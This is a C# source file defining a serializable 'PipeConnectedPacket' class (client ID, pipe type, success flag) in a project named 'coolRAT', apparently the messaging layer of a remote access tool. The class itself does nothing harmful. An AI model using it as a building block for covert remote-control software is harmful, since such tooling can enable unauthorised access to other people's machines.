using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class PipeConnectedPacket : Packet
    {
        public Guid ClientId;
        public PipeType PipeType;
        public bool Success;

        public PipeConnectedPacket(Guid clientId, PipeType pipeType, bool success)
        {
            ClientId = clientId;
            PipeType = pipeType;
            Success = success;
            Type = "PipeConnectedPacket";
        }

        public new static PipeConnectedPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<PipeConnectedPacket>(packet_string);
        }
    }
}
